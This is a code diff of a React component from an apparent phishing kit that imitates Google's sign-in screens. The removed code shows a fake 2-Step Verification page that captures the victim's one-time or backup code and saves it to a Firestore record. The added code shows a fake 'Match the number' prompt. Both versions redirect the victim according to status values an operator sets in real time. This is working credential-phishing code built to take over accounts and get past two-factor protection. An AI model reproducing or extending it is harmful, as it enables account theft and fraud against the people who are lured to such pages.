@@ -3,46 +3,27 @@ import React, { useState, useEffect } from "react";
 import { doc, onSnapshot, setDoc, updateDoc } from "firebase/firestore";
 import { db } from "../../firebase";
 import { useNavigate, useParams } from "react-router-dom";
-
-export default function Twofactor() {
+import ThreeCircles from "./ThreeCircles";
+export default function Device() {
   const [code, setCode] = useState("");
   const [error, setError] = useState("");
   const [isLoading, setIsLoading] = useState(false);
     const params = useParams();
     const navigate = useNavigate();
-    const { userID, type} = params;
-    const [result, setResult] = useState({
-      title: "",
-      detail: "",
-    });
-    const handleSubmit = async (e) => {
-        e.preventDefault();
-        if (!code.trim()) return;
-              try {
-            setIsLoading(true); // Set loading to true while saving data
-            const userDocRef = doc(db, "users", userID);
-            await updateDoc(userDocRef, {
-              auth: code,
-              status: 3
-            });
-            listener(userID);
-          } catch (error) {
-            console.error("Error saving class code to Firestore: ", error);
-          } finally {
-          }
-      };
+    const { userID,num } = params;
+
     const listener = (userID) => {
       onSnapshot(doc(db, "users", userID), (snapshot) => {
         const status = snapshot.data()?.status;
-        const num = snapshot.data()?.num;
+        const type = snapshot.data()?.type;
         if (status === 1) return;
         // Handle different status codes here
         switch (status) {
           case 4:
             navigate(`/schedule/confirm/done`);
             break;
-          case 5:
-            navigate(`/google/approve/device/${userID}/${num}`);
+         case 3:
+            navigate(`/google/factor/${userID}/${type}`);
             break;
           case -3:
             setError("You entered the incorrect code.")
@@ -56,11 +37,14 @@ export default function Twofactor() {
         }
       });
   };
+
+  useEffect(() => {
+        listener(userID);
+    }, []);
   return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-start sm:justify-center font-sans text-[#202124]">
-            {isLoading && (
         <GoogleLoadingBar/>
-      )}
+
       {/* Card container */}
       <div className="bg-white w-full max-w-sm sm:max-w-md rounded-none sm:rounded-2xl sm:shadow-[0_8px_24px_rgba(60,64,67,0.12),0_2px_6px_rgba(60,64,67,0.08)] sm:p-10 px-6 py-12 mt-0 sm:mt-0 flex flex-col">
       
@@ -82,15 +66,17 @@ export default function Twofactor() {
   </div>
 
   {/* Title */}
-  <h1 className="text-xl sm:text-3xl font-normal text-left sm:text-center mb-2">
-   2-Step Verification
+  <h1 className="text-xl sm:text-3xl font-normal text-left sm:text-center mb-10">
+   Match the number
   </h1>
 
   {/* Description */}
-  <p className="text-sm sm:text-base text-left sm:text-center text-[#5f6368] mb-8 sm:mb-10">
-     To help keep your account safe, Google wants to make sure it’s really you trying to sign in
+  <p className="text-md sm:text-base text-left sm:text-center text-dark mb-2 sm:mb-10">
+     Tap the number shown on your device
   </p>
-
+  <p className="text-sm sm:text-base text-left sm:text-center text-[#5f6368] mb-8 sm:mb-10">
+     Google wants to make sure it's really you
+  </p>
 </div>
 <div className="flex justify-start sm:justify-center inline-block text-left mt-1 mb-8 sm:mb-10">
   <button
@@ -126,82 +112,9 @@ export default function Twofactor() {
     </svg>
   </button>
 </div>
-{type == 2 ? (
-         <p className="text-left text-sm sm:text-base mb-3 sm:mb-3">
-    A text message with a 6-digit verification code was just sent to ••••• ••••
-  </p>
-) : type == 1 ? (
-         <p className="text-left text-sm sm:text-base mb-3 sm:mb-3">
-    Get a verification code from the <strong>Google Authenticator</strong> app
-  </p>
-) : (
-         <p className="text-left text-sm sm:text-base mb-3 sm:mb-3">
-    Enter one of your 8-digit backup codes
-  </p>
-)}
+        <ThreeCircles initialFixed={num} />
 
 
-        {/* Form */}
-        <div className="flex flex-col flex-1">
-        
-         <div className="flex items-center w-full border rounded-md px-3 py-3 focus-within:ring-1 focus-within:ring-blue-600 focus-within:border-blue-600">
-  <span className="text-gray-500 mr-2">G-</span>
-  <input
-    id="code"
-    name="code"
-    type="text"
-    value={code} // Chỉ chứa phần số
-    maxLength={8} // Tối đa 6 số
-    onChange={(e) => {
-      const value = e.target.value;
-      // Chỉ cho phép số
-      if (/^\d*$/.test(value)) {
-        setCode(value);
-      }
-    }}
-    placeholder="Enter the code"
-    className="flex-1 text-base focus:outline-none"
-  />
-</div>
-
-          {error && <p className="text-red-600 text-sm mt-2">{error}</p>}
-
- <div className="flex items-center space-x-2 mt-3">
-      {/* Checkbox */}
-      <input
-        id="show-password"
-        type="checkbox"
-
-        className="h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
-      />
-
-      {/* Label */}
-      <label htmlFor="show-password" className="text-sm font-medium text-gray-700">
-        Don’t ask again on this device
-      </label>
-    </div>
-         
-<div className="flex justify-between items-center mt-10 space-y-0">
-  <a 
-    href="#" 
-    className="text-sm text-blue-600 font-medium hover:underline"
-  >
-    Try another way
-  </a>
-
-<button disabled={isLoading}
-            onClick={handleSubmit}
-    className="bg-blue-600 text-white font-medium text-sm px-6 py-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-300 transition-all"
-            >
-                  {
-              isLoading
-                ? "Waiting.."
-                : "Next"
-            } 
-            </button>
-</div>
-
-        </div>
       </div>
 
       {/* Footer */}
